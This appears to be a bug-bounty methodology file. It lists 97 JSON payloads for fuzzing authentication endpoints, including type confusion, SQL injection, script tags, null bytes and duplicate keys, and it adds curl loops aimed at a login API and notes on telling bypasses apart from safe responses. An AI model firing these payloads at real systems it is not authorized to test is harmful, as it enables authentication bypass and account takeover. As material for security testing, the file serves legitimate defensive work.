---
name: "json-auth-fuzzing"
version: "2.0"
category: "api"
subcategory: "api-fuzzing"
phase: "scanning"
tags: ["api", "auth", "authentication", "authentication-bypass", "bug-bounty", "fuzzing", "injection", "json", "type-confusion", "access-control", "account-takeover", "authorization", "bypass", "cloud", "cors", "exploitation", "graphql", "idor", "iis", "information-disclosure", "js-recon", "mass-assignment", "mobile", "oauth", "path-traversal", "privesc", "session", "takeover", "token", "waf-bypass"]
tools: ["curl", "burp-suite", "ffuf", "jq", "adb", "burp", "ghauri", "sqlmap", "arjun", "authz", "autorize", "graphqlmap", "grpcurl", "john", "kiterunner", "paramalyzer", "parameth", "repeater", "restler", "zap"]
follow_up_skills: ["jwt-attacks", "mass-assignment", "sqli", "xss"]
description: "Bug bounty skill: json auth fuzzing - scanning phase, api category"
---
# JSON Authentication Fuzzing

## Summary

Comprehensive test suite for JSON-based authentication endpoints. Covers edge cases in JSON parsing, type coercion, injection, and malformed payloads that can bypass authentication, reveal errors, or cause unexpected behavior.

## Methodology

1. Send each test payload to the authentication endpoint (login, register, token refresh).
2. Compare responses (status code, response body, error message) against the baseline valid request.
3. Look for:
   - **200 OK / successful auth** — authentication bypass
   - **Different error messages** — information disclosure
   - **5xx errors / stack traces** — server-side parsing failure
   - **Increased response time** — potential injection or resource exhaustion

## Test Cases

### 1–7: Basic Type Manipulation

| # | Test | Payload |
|---|---|---|
| 1 | Basic credentials | `{"login":"admin","password":"admin"}` |
| 2 | Empty strings | `{"login":"","password":""}` |
| 3 | Null values | `{"login":null,"password":null}` |
| 4 | Numbers as credentials | `{"login":123,"password":456}` |
| 5 | Booleans as credentials | `{"login":true,"password":false}` |
| 6 | Arrays as credentials | `{"login":["admin"],"password":["password"]}` |
| 7 | Objects as credentials | `{"login":{"username":"admin"},"password":{"password":"password"}}` |

### 8–12: Special Characters & Encoding

| # | Test | Payload |
|---|---|---|
| 8 | Special characters | `{"login":"@dm!n","password":"p@ssw0rd#"}` |
| 9 | SQL injection | `{"login":"admin' --","password":"password"}` |
| 10 | HTML tags | `{"login":"<h1>admin</h1>","password":"ololo-HTML-XSS"}` |
| 11 | Unicode escape | `{"login":"\u0061\u0064\u006D\u0069\u006E","password":"\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064"}` |
| 12 | Escape characters | `{"login":"ad\\nmin","password":"pa\\ssword"}` |

### 13–17: Whitespace, Length & Malformed JSON

| # | Test | Payload |
|---|---|---|
| 13 | Whitespace only | `{"login":" ","password":" "}` |
| 14 | Overlong values | `{"login":"a"*10000,"password":"b"*10000}` |
| 15 | Missing brace | `{"login":"admin","password":"admin"` (deliberately malformed) |
| 16 | Extra trailing comma | `{"login":"admin","password":"admin",}` |
| 17 | Missing login key | `{"password":"admin"}` |

### 18–24: Structural Manipulation

| # | Test | Payload |
|---|---|---|
| 18 | Missing password key | `{"login":"admin"}` |
| 19 | Swapped key-value | `{"admin":"login","password":"password"}` |
| 20 | Extra keys | `{"login":"admin","password":"admin","extra":"extra"}` |
| 21 | Missing colon | `{"login" "admin","password":"password"}` |
| 22 | Invalid boolean | `{"login":yes,"password":no}` |
| 23 | All keys, no values | `{"":"","":""}` |
| 24 | Nested objects | `{"login":{"innerLogin":"admin"},"password":{"innerPassword":"password"}}` |

### 25–31: Case Sensitivity & Type Confusion

| # | Test | Payload |
|---|---|---|
| 25 | Case sensitivity | `{"LOGIN":"admin","PASSWORD":"password"}` |
| 26 | Login as number, password as string | `{"login":1234,"password":"password"}` |
| 27 | Login as string, password as number | `{"login":"admin","password":1234}` |
| 28 | Repeated keys | `{"login":"admin","login":"user","password":"password"}` |
| 29 | Single quotes | `{'login':'admin','password':'password'}` |
| 30 | Only special characters | `{"login":"@#$%^&*","password":"!@#$%^&*"}` |
| 31 | Unicode uppercase | `{"login":"\u0041\u0044\u004D\u0049\u004E","password":"\u0050\u0041\u0053\u0053\u0057\u004F\u0052\u0044"}` |

### 32–38: Advanced Value Types

| # | Test | Payload |
|---|---|---|
| 32 | Object instead of string | `{"login":{"$oid":"507c7f79bcf86cd7994f6c0e"},"password":"password"}` |
| 33 | Undefined variables | `{"login":undefined,"password":undefined}` |
| 34 | Extra nested objects | `{"login":"admin","password":"password","extra":{"key1":"value1","key2":"value2"}}` |
| 35 | Hex values | `{"login":"0x1234","password":"0x5678"}` |
| 36 | Extra symbols after valid JSON | `{"login":"admin","password":"password"}@@@@@}` |
| 37 | Keys without values | `{"login":,"password":}` |
| 38 | Control characters | `{"login":"ad\u0000min","password":"pass\u0000word"}` |

### 39–46: Length, Newlines & Format Variants

| # | Test | Payload |
|---|---|---|
| 39 | Long Unicode strings | `{"login":"\u0061"*10000,"password":"\u0061"*10000}` |
| 40 | Newline in strings | `{"login":"ad\nmin","password":"pa\nssword"}` |
| 41 | Tab in strings | `{"login":"ad\tmin","password":"pa\tssword"}` |
| 42 | HTML in strings | `{"login":"<b>admin","password":"password"}` |
| 43 | JSON injection in strings | `{"login":"{\"injection\":\"value\"}","password":"password"}` |
| 44 | XML in strings | `{"login":"<tag>admin</tag>","password":"<tag>password</tag>"}` |
| 45 | Mixed types | `{"login":"ad123min!@","password":"pa55w0rd!@"}` |
| 46 | Floating numbers as strings | `{"login":"123.456","password":"789.123"}` |

### 47–53: Language, Encoding & Environment

| # | Test | Payload |
|---|---|---|
| 47 | Mixed languages (English + Hindi) | Multilingual Unicode strings |
| 48 | Non-ASCII characters | `{"login":"∆admin∆","password":"∆password∆"}` |
| 49 | Single character keys/values | `{"l":"a","p":"p"}` |
| 50 | Environment variables | `{"login":"${USER}","password":"${PASS}"}` |
| 51 | Backslashes in strings | `{"login":"ad\\min","password":"pa\\ssword"}` |
| 52 | Long special character strings | `{"login":"!@#$%^&*()"*1000,"password":"!@#$%^&*()"*1000}` |
| 53 | Empty key | `{"":"admin","password":"password"}` |

### 54–60: Injection & Nested Structures

| # | Test | Payload |
|---|---|---|
| 54 | JSON injection in key | `{"{\"injection\":\"value\"}":"admin","password":"password"}` |
| 55 | Quotation marks in strings | `{"login":"\"admin\"","password":"\"password\""}` |
| 56 | Nested arrays | `{"login":[["admin"]],"password":[["password"]]}` |
| 57 | Deeply nested objects | `{"login":{"username":{"value":"admin"}}},"password":{"password":{"value":"password"}}}` |
| 58 | Keys as numbers | `{123:"admin",456:"password"}` |
| 59 | Greater/less than signs | `{"login":"admin>1","password":"<password"}` |
| 60 | Parentheses | `{"login":"(admin)","password":"(password)"}` |

### 61–70: Delimiters, Control Characters & Number Formats

| # | Test | Payload |
|---|---|---|
| 61 | Slashes | `{"login":"admin/user","password":"pass/word"}` |
| 62 | Multiple data types | Array mixing string, number, bool, null, objects |
| 63 | Escape sequences | `{"login":"admin\\r\\n\\t","password":"password\\r\\n\\t"}` |
| 64 | Curly braces in strings | `{"login":"{admin}","password":"{password}"}` |
| 65 | Square brackets in strings | `{"login":"[admin]","password":"[password]"}` |
| 66 | Only special characters | `{"login":"!@#$$%^&*()","password":"!@#$$%^&*()"}` |
| 67 | Control characters | `{"login":"admin\b\f\n\r\t\v\0","password":"password\b\f\n\r\t\v\0"}` |
| 68 | Null characters | `{"login":"admin\0","password":"password\0"}` |
| 69 | Exponential numbers | `{"login":"1e5","password":"1e10"}` |
| 70 | Hex numbers as strings | `{"login":"0xabc","password":"0x123"}` |

### 71–80: Padding, Language & Code Injection

| # | Test | Payload |
|---|---|---|
| 71 | Leading zeros | `{"login":"000123","password":"000456"}` |
| 72 | Multilingual (English + Korean) | Mixed language Unicode strings |
| 73 | Extremely long keys | `{"a"*10000:"admin","b"*10000:"password"}` |
| 74 | Extremely long Unicode strings | `{"login":"\u0061"*10000,"password":"\u0062"*10000}` |
| 75 | Semicolons | `{"login":"admin;","password":"password;"}` |
| 76 | Backticks | `{"login":"\`admin\`","password":"\`password\`"}` |
| 77 | Plus sign | `{"login":"admin+","password":"password+"}` |
| 78 | Equal sign | `{"login":"admin=","password":"password="}` |
| 79 | Asterisk | `{"login":"admin*","password":"password*"}` |
| 80 | JavaScript in JSON | `{"login":"admin<script>alert('hi')</script>","password":"password"}` |

### 81–90: Edge Case Formats

| # | Test | Payload |
|---|---|---|
| 81 | Negative numbers | `{"login":"-123","password":"-456"}` |
| 82 | Values as URLs | `{"login":"https://admin.com","password":"https://password.com"}` |
| 83 | Email format | `{"login":"admin@admin.com","password":"password@password.com"}` |
| 84 | IP address format | `{"login":"192.0.2.0","password":"203.0.113.0"}` |
| 85 | Date format | `{"login":"2023-08-03","password":"2023-08-04"}` |
| 86 | Exponential values (number) | `{"login":1e+30,"password":1e+30}` |
| 87 | Negative exponential | `{"login":-1e+30,"password":-1e+30}` |
| 88 | Zero-width space (U+200B) | `{"login":"admin\u200b","password":"password\u200b"}` |
| 89 | Zero-width joiner (U+200D) | `{"login":"admin\u200d","password":"password\u200d"}` |
| 90 | Extremely large numbers | `{"login":12345678901234567890,"password":12345678901234567890}` |

### 91–97: Remaining Edge Cases

| # | Test | Payload |
|---|---|---|
| 91 | Backspace characters | `{"login":"admin\b","password":"password\b"}` |
| 92 | Emoji | `{"login":"admin😀","password":"password😀"}` |
| 93 | JSON with comments (not standard) | `{/*"login":"admin","password":"password"*/}` |
| 94 | Base64-encoded values | `{"login":"YWRtaW4=","password":"cGFzc3dvcmQ="}` |
| 95 | Null byte (possible truncation) | `{"login":"admin\0","password":"password\0"}` |
| 96 | Scientific notation (number) | `{"login":1e100,"password":1e100}` |
| 97 | Octal escape sequences | `{"login":"\141\144\155\151\156","password":"\160\141\163\163\167\157\162\144"}` |

## Detection Commands

```bash
# Test each payload with curl
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"login":"admin","password":"admin"}'

# Automate with a payload file
for payload in $(cat json_payloads.txt); do
  echo "=== Testing: $payload ==="
  curl -s -o /dev/null -w "Status: %{http_code}, Length: %{size_download}" \
    -X POST https://target.com/api/login \
    -H "Content-Type: application/json" \
    -d "$payload"
  echo
done
```

## Not a Finding If

- The server returns consistent `400 Bad Request` for all malformed payloads (proper JSON validation)
- The server returns `401 Unauthorized` for all type-manipulation attempts (strict type checking)
- Error messages are identical regardless of the payload (no information disclosure)
- The endpoint correctly rejects overlong payloads without crashing or slowing down

## Notes

- The primary goal is authentication bypass — any payload that returns `200 OK` or `302 Redirect` indicates a critical finding
- Different error messages between payloads reveal information about validation logic (e.g., "missing field" vs "invalid type" vs "wrong credentials")
- Server crashes or 5xx errors indicate poor input validation — may be exploitable for DoS
- JSON parsers behave differently across frameworks — test the same payload on different API versions
- Unicode normalization (test 88/89) can bypass string-matching filters (e.g., `admin` vs `admin\u200b`)
- Repeated keys (test 28) — some parsers use the first value, others the last; this can bypass signature validation
- Null bytes (test 95) may truncate strings in C-based JSON parsers, bypassing suffix-based validation
